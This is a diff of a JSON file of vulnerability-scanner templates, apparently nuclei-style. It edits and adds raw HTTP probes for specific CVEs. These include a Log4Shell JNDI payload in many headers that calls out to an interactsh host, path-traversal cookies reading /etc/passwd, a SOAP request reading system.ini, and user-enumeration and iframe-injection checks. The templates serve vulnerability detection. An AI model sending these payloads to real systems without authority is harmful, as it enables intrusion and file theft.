@@ -9954,9 +9954,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
-            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml"
+            "content-type": "text/xml",
+            "Cookie": "Login"
           },
           "method": "POST",
           "path": [
@@ -14201,7 +14201,7 @@
       "requests": [
         {
           "raw": [
-            "GET /?x=${jndi:ldap://${hostName}.{{interactsh-url}}/a} HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.{{interactsh-url}}}\nReferer: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.{{interactsh-url}}}\nX-Forwarded-For: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.{{interactsh-url}}}\nAuthentication: ${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.{{interactsh-url}}}\n"
+            "GET /?x=${jndi:ldap://${hostName}.{{interactsh-url}}/a} HTTP/1.1\nHost: {{Hostname}}\nAccept: ${jndi:ldap://${hostName}.accept.{{interactsh-url}}}\nAccept-Encoding: ${jndi:ldap://${hostName}.acceptencoding.{{interactsh-url}}}\nAccept-Language: ${jndi:ldap://${hostName}.acceptlanguage.{{interactsh-url}}}\nAccess-Control-Request-Headers: ${jndi:ldap://${hostName}.accesscontrolrequestheaders.{{interactsh-url}}}\nAccess-Control-Request-Method: ${jndi:ldap://${hostName}.accesscontrolrequestmethod.{{interactsh-url}}}\nAuthentication: Basic ${jndi:ldap://${hostName}.authenticationbasic.{{interactsh-url}}}\nAuthentication: Bearer ${jndi:ldap://${hostName}.authenticationbearer.{{interactsh-url}}}\nCookie: ${jndi:ldap://${hostName}.cookiename.{{interactsh-url}}}=${jndi:ldap://${hostName}.cookievalue.{{interactsh-url}}}\nLocation: ${jndi:ldap://${hostName}.location.{{interactsh-url}}}\nOrigin: ${jndi:ldap://${hostName}.origin.{{interactsh-url}}}\nReferer: ${jndi:ldap://${hostName}.referer.{{interactsh-url}}}\nUpgrade-Insecure-Requests: ${jndi:ldap://${hostName}.upgradeinsecurerequests.{{interactsh-url}}}\nUser-Agent: ${jndi:ldap://${hostName}.useragent.{{interactsh-url}}}\nX-Api-Version: ${jndi:ldap://${hostName}.xapiversion.{{interactsh-url}}}\nX-CSRF-Token: ${jndi:ldap://${hostName}.xcsrftoken.{{interactsh-url}}}\nX-Druid-Comment: ${jndi:ldap://${hostName}.xdruidcomment.{{interactsh-url}}}\nX-Forwarded-For: ${jndi:ldap://${hostName}.xforwardedfor.{{interactsh-url}}}\nX-Origin: ${jndi:ldap://${hostName}.xorigin.{{interactsh-url}}}\n"
           ]
         }
       ]
@@ -14240,6 +14240,20 @@
       ]
     },
     {
+      "id": "CVE-2021-44848",
+      "info": {
+        "name": "Thinfinity VirtualUI User Enumeration",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /changePassword?username=administrator HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-45043",
       "info": {
         "name": "HD-Network Real-time Monitoring System 2.0 - Local File Inclusion",
@@ -14249,6 +14263,21 @@
         {
           "raw": [
             "GET /language/lang HTTP/1.1\nHost: {{Hostname}}\nReferer: {{BaseURL}}\nCookie: s_asptitle=HD-Network%20Real-time%20Monitoring%20System%20V2.0; s_Language=../../../../../../../../../../../../../../etc/passwd; s_browsertype=2; s_ip=; s_port=; s_channum=; s_loginhandle=; s_httpport=; s_sn=; s_type=; s_devtype=\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-45092",
+      "info": {
+        "name": "Thinfinity Iframe Injection",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/lab.html?vpath=//example.com"
           ]
         }
       ]
